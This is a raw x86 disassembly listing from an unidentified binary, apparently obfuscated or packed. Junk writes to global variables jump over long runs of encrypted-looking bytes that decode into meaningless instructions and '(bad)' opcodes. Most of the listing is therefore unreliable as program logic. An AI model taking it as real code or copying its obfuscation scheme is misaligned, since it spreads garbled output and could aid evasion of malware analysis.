  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433813,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x4337e7,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433813,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43378f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43381b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43379b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x433853,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0xd2a33e5f
  406b85:	cmp    eax,0x7e7e3b02
  406b8a:	mov    esp,0xd27e7e7f
  406b8f:	mov    ebp,0x2090424
  406b94:	leave  
  406b95:	pop    ecx
  406b96:	js     0x406b81
  406b98:	mov    ebx,0x82292f41
  406b9d:	push   esp
  406b9e:	out    0x30,eax
  406ba0:	loope  0x406b9a
  406ba2:	adc    eax,0x581f7803
  406ba7:	lock clc 
  406ba9:	cli    
  406baa:	cli    
  406bab:	or     ah,BYTE PTR [edi]
  406bad:	cmp    DWORD PTR [ebp+0x166a22f2],ebx
  406bb3:	cmp    eax,0xd7045729
  406bb8:	(bad)  
  406bba:	retf   0xc362
  406bbd:	mov    dl,0x3e
  406bbf:	inc    eax
  406bc0:	sti    
  406bc1:	stc    
  406bc2:	inc    esp
  406bc3:	pushf  
  406bc4:	rol    BYTE PTR [ecx-0x2e],1
  406bc7:	inc    edi
  406bc8:	sub    ebx,edi
  406bca:	jnp    0x406c47
  406bcc:	jp     0x406ba2
  406bce:	ret    0x1580
  406bd1:	(bad)  
  406bd2:	aas    
  406bd3:	mov    ch,0x67
  406bd5:	lock adc bl,BYTE PTR [eax]
  406bd8:	cdq    
  406bd9:	sbb    edi,eax
  406bdb:	retf   
  406bdc:	push   es
  406bdd:	sbb    cl,0xbe
  406be0:	pop    ebp
  406be1:	fstp   TBYTE PTR [ecx-0x60]
  406be4:	in     al,dx
  406be5:	arpl   di,dx
  406be7:	loop   0x406b71
  406be9:	inc    edi
  406bea:	or     al,0xa2
  406bec:	push   ebx
  406bed:	(bad)  
  406bee:	jb     0x406c52
  406bf0:	lahf   
  406bf1:	inc    ecx
  406bf2:	jbe    0x406c42
  406bf4:	loop   0x406c16
  406bf6:	jno    0x406b7b
  406bf8:	sbb    esi,ebx
  406bfa:	gs (bad) 
  406bfc:	in     al,dx
  406bfd:	pop    es
  406bfe:	or     bl,al
  406c00:	add    al,bl
  406c02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c03:	fist   WORD PTR [edx]
  406c05:	add    DWORD PTR [ecx-0x8ebf5de],ecx
  406c0b:	test   DWORD PTR [ebx],eax
  406c0d:	mov    cl,0xa1
  406c0f:	lahf   
  406c10:	aaa    
  406c11:	cdq    
  406c12:	jae    0x406c06
  406c14:	popa   
  406c15:	outs   dx,BYTE PTR ds:[esi]
  406c16:	data16 adc BYTE PTR [ecx],ch
  406c19:	sahf   
  406c1a:	aaa    
  406c1b:	xchg   BYTE PTR [esi+0x5bab9392],bh
  406c21:	inc    ebp
  406c22:	sbb    DWORD PTR [esi+0x16],edx
  406c25:	mov    edi,DWORD PTR [ebp+0x35]
  406c28:	pop    ebx
  406c29:	cmp    esp,edx
  406c2b:	lods   eax,DWORD PTR ds:[esi]
  406c2c:	fnstcw WORD PTR [ebp+edi*8-0x52579419]
  406c33:	das    
  406c34:	push   ss
  406c35:	or     al,0x43
  406c37:	mov    BYTE PTR [edx],bl
  406c39:	loop   0x406bdb
  406c3b:	or     DWORD PTR [edx+edi*2-0x47d8736c],ecx
  406c42:	xchg   ebx,eax
  406c43:	mov    ds:0xed42bdf1,eax
  406c48:	mov    ds:0x7863a283,eax
  406c4d:	jno    0x406c7c
  406c4f:	leave  
  406c50:	out    dx,eax
  406c51:	ficom  WORD PTR [eax+0x2e8ba388]
  406c57:	push   ss
  406c58:	je     0x406c0b
  406c5a:	stos   BYTE PTR es:[edi],al
  406c5b:	and    al,0x30
  406c5d:	and    eax,0x3392c5b
  406c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c63:	mov    dl,0xbc
  406c65:	mov    bl,0xe0
  406c67:	fidivr WORD PTR [eax]
  406c69:	ins    DWORD PTR es:[edi],dx
  406c6a:	nop
  406c6b:	mov    edx,0x2ae75796
  406c70:	ins    BYTE PTR es:[edi],dx
  406c71:	mov    esp,0x564bef78
  406c76:	lods   eax,DWORD PTR ds:[esi]
  406c77:	mov    bl,0xb
  406c79:	fistp  QWORD PTR [edi]
  406c7b:	mov    esp,0x78836109
  406c80:	ds pop edx
  406c82:	mov    dl,0xc4
  406c84:	mov    esp,0x4720ad78
  406c89:	adc    bh,BYTE PTR [eax-0x42cd2f1c]
  406c8f:	out    dx,al
  406c90:	(bad)  
  406c91:	jmp    0x5957:0x80cf545c
  406c98:	push   0xe982b9fd
  406c9d:	scas   al,BYTE PTR es:[edi]
  406c9e:	cs out dx,al
  406ca0:	add    al,0xde
  406ca2:	jae    0x406c79
  406ca4:	push   cs
  406ca5:	lods   eax,DWORD PTR ds:[esi]
  406ca6:	adc    cl,bh
  406ca8:	dec    ebx
  406ca9:	xor    al,0x7f
  406cab:	xchg   edi,eax
  406cac:	cs test eax,0xe545ca40
  406cb2:	mov    ds:0x66d6b814,eax
  406cb7:	cmp    BYTE PTR [edx-0x356340f1],0x44
  406cbe:	add    eax,0x341a1353
  406cc3:	pop    es
  406cc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cc5:	ja     0x406cd3
  406cc7:	xor    al,0x1d
  406cc9:	mov    cl,0xb4
  406ccb:	rol    BYTE PTR [esi+0x4],cl
  406cce:	jae    0x406c54
  406cd0:	push   ss
  406cd1:	dec    esi
  406cd2:	inc    ecx
  406cd3:	push   ds
  406cd4:	std    
  406cd5:	xchg   edx,eax
  406cd6:	data16 icebp 
  406cd8:	loopne 0x406cf6
  406cda:	xor    BYTE PTR [ebx+edx*1],dl
  406cdd:	sbb    al,0x24
  406cdf:	jmp    0x4ac88659
  406ce4:	out    0xac,eax
  406ce6:	pushf  
  406ce7:	lods   al,BYTE PTR ds:[esi]
  406ce8:	pusha  
  406ce9:	or     eax,0xc77c566
  406cee:	rcl    al,cl
  406cf0:	dec    ebx
  406cf1:	mov    cl,0x71
  406cf3:	jae    0x406cee
  406cf5:	je     0x406c95
  406cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cf8:	dec    ebx
  406cf9:	jp     0x406d40
  406cfb:	sbb    BYTE PTR [ecx],dh
  406cfd:	xchg   ebx,eax
  406cfe:	xlat   BYTE PTR ds:[ebx]
  406cff:	loop   0x406ca0
  406d01:	or     ebx,ebx
  406d03:	push   esp
  406d04:	xor    eax,0xbff2bb05
  406d09:	retf   
  406d0a:	retf   0xe0c0
  406d0d:	add    al,al
  406d0f:	jnp    0x406d2b
  406d11:	into   
  406d12:	pop    edi
  406d13:	mov    ch,0xb
  406d15:	je     0x406d7c
  406d17:	add    DWORD PTR [ebx],0x1c
  406d1a:	stos   DWORD PTR es:[edi],eax
  406d1b:	or     al,0x27
  406d1d:	dec    edi
  406d1e:	or     eax,DWORD PTR ds:0x3d65d492
  406d24:	jo     0x406cb1
  406d26:	ins    DWORD PTR es:[edi],dx
  406d27:	sbb    ebp,DWORD PTR [esi]
  406d29:	fucom  st(2)
  406d2b:	loop   0x406d63
  406d2d:	pop    edi
  406d2e:	cmp    BYTE PTR [ebp+0x6],bh
  406d31:	mov    al,ds:0x8108d1f8
  406d36:	pop    ds
  406d37:	and    eax,0x7e91c1f5
  406d3c:	not    DWORD PTR [esi-0x41e2eba7]
  406d42:	scas   al,BYTE PTR es:[edi]
  406d43:	push   ss
  406d44:	iret   
  406d45:	dec    edi
  406d46:	inc    ebp
  406d47:	jl     0x406d72
  406d49:	pop    ss
  406d4a:	push   ebp
  406d4b:	bound  ecx,QWORD PTR [edx+0x66fc7400]
  406d51:	xor    eax,ecx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x4338af,0x433793
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x4338a3,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x4337e3,0x43378f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0xb0
  406d91:	dec    eax
  406d92:	dec    edx
  406d93:	cmovo  edi,DWORD PTR [eax]
  406d96:	jle    0x406e16
  406d98:	mov    esp,0x6a7e7e7f
  406d9d:	ret    
  406d9e:	test   eax,0x846afa0c
  406da3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406da4:	sbb    BYTE PTR [edx-0x22],dl
  406da7:	mov    cl,0x45
  406da9:	fiadd  WORD PTR [edx+0x54ca2b41]
  406daf:	ret    0x6710
  406db2:	test   al,0xe6
  406db4:	cmp    al,0xc0
  406db6:	aaa    
  406db7:	data16 jo 0x406ddf
  406dba:	cwde   
  406dbb:	adc    DWORD PTR [eax-0x280e76b1],esi
  406dc1:	mov    edi,0x6300c875
  406dc6:	jb     0x406e2d
  406dc8:	jge    0x406d74
  406dca:	dec    esp
  406dcb:	adc    BYTE PTR [edx+0x55],dh
  406dce:	jns    0x406e0b
  406dd0:	add    DWORD PTR [edi+0x7aeec36a],ebx
  406dd6:	test   al,0xaa
  406dd8:	out    dx,eax
  406dd9:	pusha  
  406dda:	xor    DWORD PTR [esi-0x5c77b12e],esi
  406de0:	call   0xf737fa8a
  406de5:	xlat   BYTE PTR ds:[ebx]
  406de6:	sbb    al,0xaa
  406de8:	popf   
  406de9:	ss jne 0x406e26
  406dec:	mov    ds:0xac33c159,eax
  406df1:	sbb    ebp,esi
  406df3:	pusha  
  406df4:	cld    
  406df5:	xor    al,0x84
  406df7:	call   0xbe00:0x9a2007a0
  406dfe:	push   ebx
  406dff:	pop    ss
  406e00:	scas   al,BYTE PTR es:[edi]
  406e01:	icebp  
  406e02:	outs   dx,DWORD PTR ds:[esi]
  406e03:	imul   eax,ebx,0x38
  406e06:	push   ebx
  406e07:	pextrw ebx,mm7,0xb7
  406e0b:	scas   eax,DWORD PTR es:[edi]
  406e0c:	mov    ds:0x38cab432,eax
  406e11:	add    ah,BYTE PTR [edx]
  406e13:	test   BYTE PTR [eax+0x18],ch
  406e16:	fadd   QWORD PTR [eax-0x65598f86]
  406e1c:	xchg   ebp,eax
  406e1d:	aaa    
  406e1e:	popf   
  406e1f:	add    dh,bh
  406e21:	(bad)  
  406e22:	push   ds
  406e23:	ins    BYTE PTR es:[edi],dx
  406e24:	popa   
  406e25:	or     DWORD PTR [eax-0x11],edx
  406e28:	xchg   ebp,eax
  406e29:	les    ebx,FWORD PTR [eax+ebp*2+0x3c]
  406e2d:	(bad)  
  406e2e:	mov    al,al
  406e30:	sub    edi,edi
  406e32:	dec    ebx
  406e33:	call   0xb83c:0xa6ffd559
  406e3a:	xchg   esi,eax
  406e3b:	push   0xffffffb3
  406e3d:	sbb    DWORD PTR [edx+eax*4-0x4d3c2b79],eax
  406e44:	hlt    
  406e45:	std    
  406e46:	jo     0x406e95
  406e48:	xchg   esp,eax
  406e49:	xchg   DWORD PTR [edi-0x5dffa7fd],eax
  406e4f:	mov    edx,0xb0173e6b
  406e54:	lods   al,BYTE PTR ds:[esi]
  406e55:	sbb    dh,bl
  406e57:	sub    bl,cl
  406e59:	inc    DWORD PTR [edi]
  406e5b:	jg     0x406e38
  406e5d:	jmp    0xe55b2b99
  406e62:	scas   eax,DWORD PTR es:[edi]
  406e63:	push   ebp
  406e64:	mov    bh,0xd6
  406e66:	mov    eax,ds:0x4790ced1
  406e6b:	inc    ebp
  406e6c:	mov    esi,0x739c30ba
  406e71:	and    al,BYTE PTR [ebp-0x22]
  406e74:	lods   eax,DWORD PTR ds:[esi]
  406e75:	jb     0x406e1a
  406e77:	adc    ah,BYTE PTR [edx]
  406e79:	jmp    0x9d93:0x4b66a590
  406e80:	inc    edi
  406e81:	inc    esi
  406e82:	shr    dh,cl
  406e84:	aas    
  406e85:	dec    esp
  406e86:	ret    
  406e87:	out    dx,al
  406e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e89:	inc    ebp
  406e8a:	or     edx,eax
  406e8c:	rcr    BYTE PTR [esi],1
  406e8e:	cmp    BYTE PTR [ebx],bh
  406e90:	mov    ah,0xed
  406e92:	xchg   ebx,eax
  406e93:	scas   al,BYTE PTR es:[edi]
  406e94:	into   
  406e95:	add    BYTE PTR [edx+0x43],cl
  406e98:	xor    eax,0x46227779
  406e9d:	aad    0x48
  406e9f:	icebp  
  406ea0:	ss or  al,0xb8
  406ea3:	or     dl,ch
  406ea5:	in     eax,0xf1
  406ea7:	or     BYTE PTR [eax],bl
  406ea9:	sbb    BYTE PTR [ebp+0x3da66060],0xe9
  406eb0:	xor    al,0xa9
  406eb2:	push   cs
  406eb3:	add    ecx,DWORD PTR [eax+0x2a766b2e]
  406eb9:	mul    ebx
  406ebb:	lds    ecx,FWORD PTR [ebp+0x31fdaf14]
  406ec1:	imul   eax,esp,0x6f
  406ec4:	arpl   WORD PTR [edi+0x47],cx
  406ec7:	sti    
  406ec8:	add    ecx,DWORD PTR [esi]
  406eca:	add    DWORD PTR ds:0x9f39a481,esp
  406ed0:	sar    DWORD PTR [esi-0x49],cl
  406ed3:	fldcw  WORD PTR [edx+0x3743d33b]
  406ed9:	shr    esi,cl
  406edb:	push   ebx
  406edc:	fstp   TBYTE PTR [ebx-0xb]
  406edf:	int3   
  406ee0:	push   esi
  406ee1:	inc    edx
  406ee2:	call   0x5d6c:0x9615f5cd
  406ee9:	test   BYTE PTR [ebx],al
  406eeb:	adc    al,0x98
  406eed:	mov    gs,ecx
  406eef:	sbb    ch,BYTE PTR [ecx+0xf]
  406ef2:	xor    eax,0x1e781219
  406ef7:	rcr    al,cl
  406ef9:	adc    DWORD PTR [esi],edi
  406efb:	add    BYTE PTR [ebx+0x36],bh
  406efe:	xor    BYTE PTR [ecx-0x2d],ah
  406f01:	xor    DWORD PTR [edi+edi*1+0x50584acd],eax
  406f08:	lods   eax,DWORD PTR ds:[esi]
  406f09:	ins    BYTE PTR es:[edi],dx
  406f0a:	cmp    eax,0x7d680c15
  406f0f:	and    eax,0x49e9a50e
  406f14:	or     esi,edx
  406f16:	sub    eax,0x513f0f04
  406f1b:	xor    eax,0x3cbedd0f
  406f20:	xor    cl,BYTE PTR [edi-0x5d]
  406f23:	inc    edi
  406f24:	cmp    DWORD PTR [edx],edx
  406f26:	sub    esp,0xffffff81
  406f29:	push   ds
  406f2a:	inc    ebx
  406f2b:	pop    eax
  406f2c:	addr16 jp 0x406f37
  406f2f:	call   0x2e9ce45a
  406f34:	out    0x28,al
  406f36:	nop
  406f37:	push   cs
  406f38:	repnz cmp esi,DWORD PTR [edi-0x67]
  406f3c:	fs rcl edi,cl
  406f3f:	mov    ah,al
  406f41:	call   0x3014d9f2
  406f46:	adc    eax,0x9c9b3dc3
  406f4b:	cmp    DWORD PTR [edi+eiz*2],edi
  406f4e:	ins    DWORD PTR es:[edi],dx
  406f4f:	add    BYTE PTR [esi+0x58],bl
  406f52:	and    dh,ah
  406f54:	xchg   esp,eax
  406f55:	xchg   DWORD PTR [edx],esp
  406f57:	aaa    
  406f58:	(bad)  
  406f5a:	pusha  
  406f5b:	mov    BYTE PTR [eax],bl
  406f5d:	mov    ecx,0x2581d0f7
  406f62:	(bad)  
  406f63:	aaa    
  406f64:	inc    ebx
  406f65:	add    bl,dl
  406f67:	aaa    
  406f68:	inc    ebx
  406f69:	add    BYTE PTR [ebx],ah
  406f6b:	add    DWORD PTR [ebx+0x189084d],ecx
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x6386a045
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x8d7e7e7f
  406f9f:	jmp    0x406f2c
  406fa1:	jnp    0x406feb
  406fa3:	popf   
  406fa4:	xchg   ecx,eax
  406fa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fa6:	fcmovb st,st(4)
  406fa8:	pop    eax
  406fa9:	mov    eax,0x6959801a
  406fae:	dec    esi
  406faf:	scas   eax,DWORD PTR es:[edi]
  406fb0:	sar    BYTE PTR [edi+edx*8],1
  406fb3:	data16 int 0xa9
  406fb6:	and    cl,dl
  406fb8:	cmp    ebx,eax
  406fba:	(bad)
  406fbd:	outs   dx,BYTE PTR ds:[esi]
  406fbe:	pop    ds
  406fbf:	or     al,0x63
  406fc1:	sub    edi,DWORD PTR [ecx+0x3a]
  406fc4:	mov    gs,ebp
  406fc6:	(bad)  
  406fc7:	loopne 0x407026
  406fc9:	mov    bl,0xb0
  406fcb:	push   0xd67974ab
  406fd0:	pop    esp
  406fd1:	jmp    DWORD PTR [ecx]
  406fd3:	cli    
  406fd4:	pop    ebp
  406fd5:	adc    BYTE PTR [esi+0x73cd6528],bl
  406fdb:	sub    eax,0xf2326ba
  406fe0:	sub    eax,0xe80e9b86
  406fe5:	fmul   st,st(0)
  406fe7:	ins    DWORD PTR es:[edi],dx
  406fe8:	pushf  
  406fe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406fea:	ja     0x40702a
  406fec:	cdq    
  406fed:	xchg   esp,eax
  406fee:	cmc    
  406fef:	fisttp DWORD PTR [edx+edx*4+0x5e]
  406ff3:	ins    DWORD PTR es:[edi],dx
  406ff4:	xchg   esi,eax
  406ff5:	shr    ebx,0x6b
  406ff8:	pop    es
  406ff9:	arpl   WORD PTR [edi-0x652e9e2b],cx
  406fff:	xor    ah,BYTE PTR [esi+0x43]
  407002:	pop    ebp
  407003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407004:	ins    BYTE PTR es:[edi],dx
  407005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407006:	jb     0x407023
  407008:	cmp    BYTE PTR [ebx-0x2d6bb1b3],ah
  40700e:	and    cl,BYTE PTR [ecx]
  407010:	mov    ebp,DWORD PTR [esi]
  407012:	adc    BYTE PTR [ecx],dl
  407014:	iret   
  407015:	mov    WORD PTR [eax],ss
  407017:	pop    ds
  407018:	scas   eax,DWORD PTR es:[edi]
  407019:	mov    edx,0x8b0e3890
  40701e:	mov    edx,0x6ae7071e
  407023:	adc    ah,bh
  407025:	inc    ebx
  407026:	or     ebx,0xcb9609eb
  40702c:	test   BYTE PTR [eax],bh
  40702e:	inc    edi
  40702f:	aas    
  407030:	or     al,0x19
  407032:	jecxz  0x406fd1
  407034:	xor    DWORD PTR [ebp-0x3f],edi
  407037:	sti    
  407038:	or     ebp,esp
  40703a:	dec    edi
  40703b:	xlat   BYTE PTR ds:[ebx]
  40703c:	aad    0x3b
  40703e:	add    DWORD PTR [edx+ebx*8-0x32d68289],edx
  407045:	outs   dx,BYTE PTR ds:[esi]
  407046:	idiv   DWORD PTR [eax]
  407048:	pop    ss
  407049:	mov    dl,0x24
  40704b:	and    BYTE PTR [ebx-0x21d392f9],ch
  407051:	push   cs
  407052:	call   FWORD PTR [edi+ebx*4]
  407055:	xlat   BYTE PTR ds:[ebx]
  407056:	loopne 0x407018
  407058:	test   DWORD PTR [edx-0x462b47c7],eax
  40705e:	sbb    BYTE PTR [eax],bl
  407060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407061:	mov    ebp,0x3ce1ca90
  407066:	and    ch,BYTE PTR [eax+0x19706a30]
  40706c:	pop    esi
  40706d:	shr    BYTE PTR [ebp-0x18],1
  407070:	and    eax,0x81bf357
  407075:	dec    edx
  407076:	sub    al,0x15
  407078:	outs   dx,BYTE PTR ds:[esi]
  407079:	test   BYTE PTR ss:[ebp+0x728cdc23],ah
  407080:	sub    BYTE PTR [ebx-0x6d],bh
  407083:	mov    ds:0xf43dde16,al
  407088:	or     eax,0x16dd380e
  40708d:	ret    0x79a6
  407090:	ja     0x4070c1
  407092:	fbstp  TBYTE PTR [ebx-0x49b76edd]
  407098:	(bad)  
  407099:	out    dx,eax
  40709a:	pop    ss
  40709b:	nop
  40709c:	(bad)  
  40709d:	mov    ebp,0x1020328
  4070a2:	fbstp  TBYTE PTR [ebx]
  4070a4:	das    
  4070a5:	es lahf 
  4070a7:	daa    
  4070a8:	cwde   
  4070a9:	fwait
  4070aa:	push   edi
  4070ab:	or     BYTE PTR [edx],bh
  4070ad:	das    
  4070ae:	dec    edx
  4070af:	test   al,0xe4
  4070b1:	inc    dh
  4070b3:	call   0xb723:0x58922fe4
  4070ba:	sbb    BYTE PTR [ebp+0x28bb013d],al
  4070c0:	jnp    0x40709d
  4070c2:	add    eax,0xa023ad59
  4070c7:	dec    ecx
  4070c8:	mov    eax,ds:0xff260e66
  4070cd:	stos   DWORD PTR es:[edi],eax
  4070ce:	or     ebx,DWORD PTR [edi]
  4070d0:	ret    0x97e5
  4070d3:	cmp    al,BYTE PTR [eax]
  4070d5:	add    al,0x48
  4070d7:	loop   0x4070fa
  4070d9:	sbb    al,0x2c
  4070db:	fnstenv [eax+0x2c]
  4070de:	cwde   
  4070df:	cmp    al,0xba
  4070e1:	ins    BYTE PTR es:[edi],dx
  4070e2:	sub    dl,al
  4070e4:	lods   al,BYTE PTR ds:[esi]
  4070e5:	push   eax
  4070e6:	in     eax,dx
  4070e7:	or     eax,0xb18d9e1c
  4070ec:	fisubr DWORD PTR [eax-0x7d]
  4070ef:	shl    DWORD PTR [eax+0x698738c0],cl
  4070f5:	test   eax,0x9cd4551a
  4070fa:	mov    esi,0xc53e0572
  4070ff:	push   es
  407100:	jae    0x4070a4
  407102:	xchg   esp,eax
  407103:	test   BYTE PTR [edx-0x4ae76470],ch
  407109:	cwde   
  40710a:	test   BYTE PTR [edi+ecx*8+0x344de1d7],bl
  407111:	in     al,dx
  407112:	jl     0x40713b
  407114:	test   eax,0x7172d239
  407119:	pop    ss
  40711a:	pop    esp
  40711b:	call   0xc773:0x1bdee003
  407122:	je     0x4070d9
  407124:	pop    esp
  407125:	call   0xa81d8107
  40712a:	faddp  st(4),st
  40712c:	and    al,0x29
  40712e:	jecxz  0x40717c
  407130:	stos   BYTE PTR es:[edi],al
  407131:	inc    edi
  407132:	xchg   ebp,eax
  407133:	dec    ebx
  407134:	mov    cl,0x4c
  407136:	dec    edx
  407137:	lea    esp,[edx+0x56526bf9]
  40713d:	pusha  
  40713e:	add    ecx,DWORD PTR [esp+esi*4+0x18]
  407142:	xchg   esp,eax
  407143:	inc    ebp
  407144:	pop    es
  407145:	(bad)  
  407146:	(bad)  
  407147:	mov    dl,bh
  407149:	hlt    
  40714a:	mov    gs,WORD PTR [eax+0x1f]
  40714d:	jnp    0x4071ae
  40714f:	or     DWORD PTR [edi-0x35881042],ecx
  407155:	mov    eax,ds:0x4acd1a19
  40715a:	mov    bl,0x62
  40715c:	xchg   bl,cl
  40715e:	mov    bh,BYTE PTR [esi-0x1]
  407161:	jne    0x40716b
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	cmp    BYTE PTR [esi+ebx*1+0x7ec4ccc3],bl
  407182:	jle    0x407140
  407184:	jg     0x407204
  407186:	jle    0x40712e
  407188:	mov    ah,0x39
  40718a:	push   ss
  40718b:	daa    
  40718c:	repnz and eax,0x7a81b1ed
  407192:	daa    
  407193:	sub    ch,cl
  407195:	sub    cl,BYTE PTR [ecx+0x25]
  407198:	pop    es
  407199:	cs sar dh,0x98
  40719d:	pop    ebp
  40719e:	sub    BYTE PTR ds:0x9139da48,al
  4071a4:	out    dx,al
  4071a5:	loopne 0x407216
  4071a7:	outs   dx,BYTE PTR ds:[esi]
  4071a8:	mov    DWORD PTR [edx],ebx
  4071aa:	push   edi
  4071ab:	xchg   esi,eax
  4071ac:	js     0x4071ec
  4071ae:	pop    eax
  4071af:	xor    al,BYTE PTR [edi]
  4071b1:	icebp  
  4071b2:	pop    ecx
  4071b3:	xor    DWORD PTR [eax-0x5f],edi
  4071b6:	repnz pop ds
  4071b8:	rcr    DWORD PTR [edi-0x3201ee9],cl
  4071be:	adc    dl,BYTE PTR [edx]
  4071c0:	in     eax,0x7b
  4071c2:	inc    ebp
  4071c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071c4:	sbb    BYTE PTR ds:0xcba88930,0xb3
  4071cb:	mov    eax,0xd2ab1938
  4071d0:	ret    0xa9a
  4071d3:	in     al,0x7c
  4071d5:	fadd   st(6),st
  4071d7:	dec    ebx
  4071d8:	jle    0x407249
  4071da:	ror    DWORD PTR [esi+0x8b228b8],1
  4071e0:	cmp    esp,DWORD PTR [edi]
  4071e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071e3:	mov    DWORD PTR ds:0x97457fd0,ebp
  4071e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071ea:	push   esp
  4071eb:	xor    BYTE PTR [edi],ah
  4071ed:	out    dx,eax
  4071ee:	(bad)  
  4071ef:	sub    ebx,DWORD PTR [eax]
  4071f1:	xchg   edi,eax
  4071f2:	out    0x66,al
  4071f4:	jno    0x407181
  4071f6:	(bad)  
  4071f7:	div    DWORD PTR [esi]
  4071f9:	in     al,0xf4
  4071fb:	add    BYTE PTR [esi+0x4c],dh
  4071fe:	jne    0x407261
  407200:	xchg   ebp,eax
  407201:	mov    ds:0x33a8acf9,al
  407206:	inc    edi
  407207:	cmc    
  407208:	dec    ecx
  407209:	pop    edx
  40720a:	scas   eax,DWORD PTR es:[edi]
  40720b:	(bad)  
  40720c:	push   ebx
  40720d:	arpl   WORD PTR [edi],ax
  40720f:	bswap  esi
  407211:	lds    esp,FWORD PTR [ecx-0x2b]
  407214:	ja     0x40727b
  407216:	xchg   ebp,eax
  407217:	mov    al,0x86
  407219:	jp     0x407266
  40721b:	popf   
  40721c:	xlat   BYTE PTR ds:[ebx]
  40721d:	xor    al,0xb0
  40721f:	push   edi
  407220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407221:	imul   ebx,ebx,0xffffffaa
  407224:	xor    al,0xc6
  407226:	test   DWORD PTR [esi],eax
  407228:	mov    DWORD PTR [ecx+0x44],0xd36fe464
  40722f:	jb     0x40724a
  407231:	out    0x50,al
  407233:	dec    eax
  407234:	and    al,0xde
  407236:	(bad)  
  407237:	mov    cl,0x60
  407239:	cdq    
  40723a:	jmp    0x407240
  40723c:	dec    ebp
  40723d:	sbb    DWORD PTR [ecx-0x36],edx
  407240:	add    ebp,ebp
  407242:	cli    
  407243:	sub    DWORD PTR [edx],edx
  407245:	mov    ecx,DWORD PTR [ebp-0x5f83f782]
  40724b:	es push ss
